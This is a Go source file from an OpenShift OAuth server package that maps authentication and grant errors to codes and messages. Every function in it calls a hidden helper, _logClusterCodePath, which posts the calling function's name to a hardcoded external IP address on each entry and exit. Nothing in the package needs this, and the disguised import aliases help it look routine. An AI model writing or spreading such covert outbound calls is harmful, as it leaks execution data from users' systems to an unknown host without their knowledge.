package errorpage

import (
	godefaultbytes "bytes"
	"github.com/openshift/origin/pkg/oauthserver/userregistry/identitymapper"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	errorCodeClaim          = "mapping_claim_error"
	errorCodeLookup         = "mapping_lookup_error"
	errorCodeAuthentication = "authentication_error"
	errorCodeGrant          = "grant_error"
)

func AuthenticationErrorCode(err error) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch {
	case identitymapper.IsClaimError(err):
		return errorCodeClaim
	case identitymapper.IsLookupError(err):
		return errorCodeLookup
	default:
		return errorCodeAuthentication
	}
}
func AuthenticationErrorMessage(code string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch code {
	case errorCodeClaim:
		return "Could not create user."
	case errorCodeLookup:
		return "Could not find user."
	default:
		return "An authentication error occurred."
	}
}
func GrantErrorCode(err error) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return errorCodeGrant
}
func GrantErrorMessage(code string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "A grant error occurred."
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
